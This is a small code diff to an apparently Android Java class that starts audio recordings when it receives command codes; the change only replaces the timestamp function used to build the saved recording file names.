@@ -308,7 +308,7 @@ public class CodeDoing implements Runnable {
 		code.setRedoNeed(Code.REDO_NOT);
 		Debug.e(TAG, "开始录音");
 		// 文件保存位置
-		String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis());
+		String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeFileNameString(TimeUtil.getCurrentTimeMillis());
 		if (RecorderUtil.getInstence(context).startRecorder(fileName, -1)) {
 			code.setResult(Code.RESULT_OK);
 		}
@@ -354,7 +354,7 @@ public class CodeDoing implements Runnable {
 
 			Debug.e(TAG, "录音N分钟: " + strs[1]);
 			// 文件保存位置
-			String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "-" + strs[1] + " minutes";
+			String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeFileNameString(TimeUtil.getCurrentTimeMillis()) + "-" + strs[1] + " minutes";
 			if (RecorderUtil.getInstence(context).startRecorder(fileName, Integer.parseInt(strs[1]))) {
 				code.setResult(Code.RESULT_OK);
 			}
